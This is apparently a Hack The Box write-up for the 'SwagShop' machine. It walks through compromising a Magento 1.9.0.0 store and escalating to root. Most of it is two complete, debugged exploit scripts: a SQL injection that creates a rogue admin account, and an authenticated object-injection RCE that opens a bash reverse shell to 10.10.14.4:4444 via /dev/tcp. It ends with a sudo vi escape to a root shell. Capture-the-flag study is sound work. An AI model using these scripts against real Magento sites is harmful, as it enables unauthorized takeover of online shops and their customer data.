This box was the hardest easy box with a lot of lessons attached to it, so let's go through it.

To start with, you only have two ports open: port 80 and port 22. You put `swagshop.htb` into `/etc/hosts` and navigate to the website. You can see that it is a PHP website and, with a little looking, a **Magento** website. You can use **magescan** to find the version used. If you look up the vulnerabilities for this version (1.9.0.0), you'll find it has a SQLi and an RCE vuln.

The problem with these two scripts is that they **don't work** out of the box — you'll have to do some minor coding to make them work properly. For the first one there's less debugging. All the print statements don't have parentheses, so you just have to add them. After that, you add `swagshop.htb` by itself in the terminal.

The first script makes an account with admin privileges that you are able to use:

```python
import requests
import base64
import sys

target = sys.argv[1]

# Normalize URL format
if not target.startswith("http"):
    target = "http://" + target
if target.endswith("/"):
    target = target[:-1]

target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"

# SQL query for admin user creation
SQLQUERY = """
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO admin_user (
    firstname, lastname, email, username, password,
    created, lognum, reload_acl_flag, is_active,
    extra, rp_token, rp_token_created_at
) VALUES (
    'Firstname', 'Lastname', 'email@example.com',
    '{username}', @PASS, NOW(), 0, 0, 1,
    @EXTRA, NULL, NOW()
);
INSERT INTO admin_role (
    parent_id, tree_level, sort_order, role_type,
    user_id, role_name
) VALUES (
    1, 2, 0, 'U',
    (SELECT user_id FROM admin_user WHERE username = '{username}'),
    'Firstname'
);
"""

# Format and encode query
query = SQLQUERY.replace("\n", "").format(username="ypwq", password="123")
pfilter = bytes(
    "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}"
    .format(query),
    'utf-8'
)

# Base64 encoded directive for CSV file generation
directive = "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ"
# {{block type=Adminhtml/report_search_grid output=getCsvFile}}

r = requests.post(
    target_url,
    data={
        "___directive": directive,
        "filter": base64.b64encode(pfilter),
        "forwarded": 1
    }
)

if r.ok:
    print("WORKED")
    print("Check {0}/admin with creds ypwq:123".format(target))
else:
    print("DID NOT WORK")
```

The second script uses the credentials made in the first to do some remote code execution, giving you a reverse shell. The only problem is that when you use searchsploit and find an RCE PoC, it also doesn't work out of the box: multiple print statements are wrong, multiple lines compare bytes with strings and strings with bytes, and the `php_function` should be `exec`, not `system`.

This is the script that actually works:

```python
from hashlib import md5
import sys
import re
import base64
import mechanize

target = sys.argv[1]
arg = 'bash -c "bash -i >& /dev/tcp/10.10.14.4/4444 0>&1"'

username = 'ypwq'
password = '123'
php_function = 'exec'  # we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # exact date from /app/etc/local.xml

# POP chain to pivot into call_user_exec
payload = 'O:8:"Zend_Log":1:{s:11:"\00*\00_writers";a:2:{i:0;O:20:"Zend_Log_Writer_Mail":4:{s:16:' \
         '"\00*\00_eventsToMail";a:3:{i:0;s:11:"EXTERMINATE";i:1;s:12:"EXTERMINATE!";i:2;s:15:"' \
         'EXTERMINATE!!!!";}s:22:"\00*\00_subjectPrependText";N;s:10:"\00*\00_layout";O:23:"'     \
         'Zend_Config_Writer_Yaml":3:{s:15:"\00*\00_yamlEncoder";s:%d:"%s";s:17:"\00*\00'     \
         '_loadedSection";N;s:10:"\00*\00_config";O:13:"Varien_Object":1:{s:8:"\00*\00_data"' \
         ';s:%d:"%s";}}s:8:"\00*\00_mail";O:9:"Zend_Mail":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                              len(arg), arg)

br = mechanize.Browser()
br.set_handle_robots(False)

request = br.open(target)
br.select_form(nr=0)
br.form.fixup()
br['login[username]'] = username
br['login[password]'] = password
br.method = "POST"
request = br.submit()
content = request.read().decode('utf-8')

url = re.search(r"ajaxBlockUrl = \'(.*)\'", content).group(1)
key = re.search(r"var FORM_KEY = '(.*)'", content).group(1)

request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
tunnel = re.search(r"src=\"(.*)\?ga=", request.read().decode('utf-8')).group(1)

payload_encoded = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
gh = md5(payload_encoded.encode('utf-8') + install_date.encode('utf-8')).hexdigest()
exploit = f"{tunnel}?ga={payload_encoded}&h={gh}"

try:
    request = br.open(exploit)
except (mechanize.HTTPError, mechanize.URLError) as e:
    print(e.read())
```

Using the script above, you'll get a reverse shell and the `user.txt` file.

Running `sudo -l`, you see you can run vim as sudo using specifically `/usr/bin/vi /var/www/html*` — and you have to do it just like that. Doing this, you can run `:!sh` and get a shell as root. You can finally `cat` the `root.txt` file.
